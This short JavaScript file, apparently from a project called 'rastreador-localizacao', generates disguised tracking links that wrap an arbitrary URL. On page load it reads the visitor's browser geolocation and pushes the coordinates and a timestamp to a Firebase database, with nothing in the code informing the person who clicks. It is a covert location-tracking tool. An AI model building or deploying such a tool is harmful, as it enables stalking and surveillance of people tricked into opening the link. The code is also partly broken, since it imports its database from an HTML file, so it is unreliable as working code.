import { database } from './index.html'; // Remova 'index.html'

const urlInput = document.getElementById('urlInput');
const createLinkButton = document.getElementById('createLinkButton');
const trackingLink = document.getElementById('trackingLink');

createLinkButton.addEventListener('click', () => {
    const url = urlInput.value;
    const trackingId = generateTrackingId();
    const trackingUrl = `https://lavinia0cristine0souza.github.io/rastreador-localizacao/track?id=${trackingId}&url=${encodeURIComponent(url)}`;
    trackingLink.textContent = trackingUrl;
});

function generateTrackingId() {
    return Math.random().toString(36).substring(2, 15);
}

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const { latitude, longitude } = position.coords;
            sendLocationToFirebase(latitude, longitude);
        });
    }
}

function sendLocationToFirebase(latitude, longitude) {
    database.ref('locations/').push({
        latitude: latitude,
        longitude: longitude,
        timestamp: Date.now()
    });
}

window.onload = function() {
    getLocation();
};
